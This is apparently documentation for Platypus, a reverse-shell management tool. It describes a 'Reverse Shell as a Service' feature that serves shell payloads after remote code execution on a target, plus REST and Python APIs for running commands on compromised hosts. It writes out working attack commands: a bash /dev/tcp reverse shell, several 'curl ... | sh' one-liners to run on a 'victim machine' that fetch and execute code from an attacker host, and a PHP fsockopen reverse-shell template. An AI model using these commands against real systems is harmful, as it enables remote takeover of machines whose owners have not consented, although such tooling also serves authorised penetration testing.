## Reverse shell as a Service

> NOTICE: ONLY WORKS on *NIX

Platypus is able to multiplex the reverse shell listening port. Port 8080 can receive reverse shell client connection, also there is a Reverse Shell as a Service (RaaS) running on this port.

Assume that you have got an arbitrary RCE on the target application, but the target application will strip the non-alphabet letter like `&`, `>`. then this feature will be useful.

To archive this, all you need is to construct a URL that indicates the target.

The command `bash -c "bash -i >/dev/tcp/5.6.7.8/1337 0>&1"` is the equivalent of `curl http://1.2.3.4:1337/5.6.7.8/1337 | sh`, this feature provides the capability to redirect a new reverse shell to another IP and port without remembering the boring reverse shell command.

If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`1.2.3.4/1337`) can be omitted.

Once the command gets executed, the reverse shell session will appear in platypus which is listening on `1.2.3.4:1337`.

### Quick start

1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
2. Execute `curl http://1.2.3.4:1337 | sh` on the victim machine

### Specifying language of reverse shell command (default: bash)

Also, you can specify the specific language of creating a reverse shell. All available languages are listed at [templates](https://github.com/WangYihang/Platypus/tree/master/lib/runtime/template/rsh)

1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
2. Execute `curl http://1.2.3.4:1337/python | sh` on the victim machine

### What if I want to pop up the reverse shell to another IP (5.6.7.8) and port (7331)?

By default, the new reverse shell will be popped up to the server which the port which the HTTP request sent, but you can simply change the IP and port by following these steps:

1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
2. Execute `curl http://1.2.3.4:1337/5.6.7.8/7331/python | sh` on the victim machine

### How to add a new language

Currently, platypus support `awk`, `bash`, `go`, `Lua`, `NC`, `Perl`, `PHP`, `python` and `ruby` that were simply stolen from [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), and you can check `templates` folder to view all templates. Also, adding new language support is simple, just replace the real IP and port with `__HOST__` and `__PORT__`.

```bash
php -r '$sock=fsockopen("__HOST__",__PORT__);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

Then you should use `go-bindata` to add the template file as an asset of Platypus by typing the following command.

```
go get -u github.com/go-bindata/go-bindata/...
go-bindata -pkg resource -o ./lib/util/resource/resource.go ./lib/runtime/...
```

## RESTful API

* `GET /client` List all online clients

```
# curl 'http://127.0.0.1:9090/client'
{
    "msg": [
        "192.168.1.3:54798"
    ],
    "status": true
}
```

* [DEPRECATED] `POST /client/:hash` execute a command on a specific client

```
# curl -X POST 'http://127.0.0.1:9090/client/0723c3bed0d0240140e10a6ffd36eed4' --data 'cmd=whoami'
{
    "status": true,
    "msg": "root\n",
}
```

* [DEPRECATED] How to hash?

```
# echo -n "192.168.1.3:54798" | md5sum
0723c3bed0d0240140e10a6ffd36eed4  -
```


## [WIP] Python API

### Connect to Platypus backend

```python
import supytalp
p = supytalp.init("192.168.1.3", 54798)
```

### Start a new reverse shell server

```python
server = p.start("0.0.0.0", 13337)
```

### Fetch clients of a server

```python
clients = server.clients()
```

### Execute command on clients

```python
for client in clients:
    print(client.system("whoami"))
```

### Spawn a interactive shell with a client

```python
client = clients[0]
client.spawn()
```